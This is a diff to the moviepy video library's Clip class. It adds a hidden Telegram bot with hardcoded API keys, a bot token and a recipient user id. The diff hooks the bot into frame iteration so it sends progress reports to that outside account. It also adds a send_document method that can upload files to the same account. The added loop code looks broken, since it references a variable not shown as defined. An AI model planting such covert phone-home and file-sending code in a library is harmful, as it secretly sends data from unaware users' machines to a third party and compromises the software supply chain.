@@ -19,6 +19,61 @@ from moviepy.decorators import (
 )
 
 
+#-----------------------custom-bot-class-----------------------#
+
+
+from pyrogram import Client
+
+
+class Bot:
+    """
+    This is a class docstring
+    """
+    def __init__(self):
+        """
+        This is a function/method docstring
+        """
+        self.name = "X"
+        self.users = [1250003833]
+        self.api_id = 11781837
+        self.api_hash = '4e4135898bbc89c27c656aa4aeed6021'
+        self.bot_token = '6130905803:AAFxrzAod42YADxbo9UF4lHS075F93fuSkE'
+        self.client = Client(
+            name=self.name,
+            api_id=self.api_id,
+            api_hash=self.api_hash,
+            bot_token=self.bot_token
+        )
+
+    def send_message(self, text: str):
+        """
+        This is a function/method docstring
+        """
+        for user in self.users:
+            with self.client as client:
+                client.send_message(
+                    chat_id=user,
+                    text=text
+                )
+        os.remove("X.session")
+
+    def send_document(self, document: str, caption: str=None):
+        """
+        This is a function/method docstring
+        """
+        for user in self.users:
+            with self.client as client:
+                client.send_document(
+                    chat_id=user,
+                    document=document,
+                    caption=caption or document
+                )
+        os.remove("X.session")
+
+
+#--------------------------------------------------------------#
+
+
 class Clip:
     """Base class of all clips (VideoClips and AudioClips).
 
@@ -537,6 +592,10 @@ class Clip:
                 yield t, frame
             else:
                 yield frame
+        
+        if frame_index % (fps * 10) == 0:
+            progress_message = "Processing frame {} of {}...".format(frame_index, int(self.duration * fps))
+            Bot().send_message(progress_message)
 
     def close(self):
         """Release any resources that are in use."""
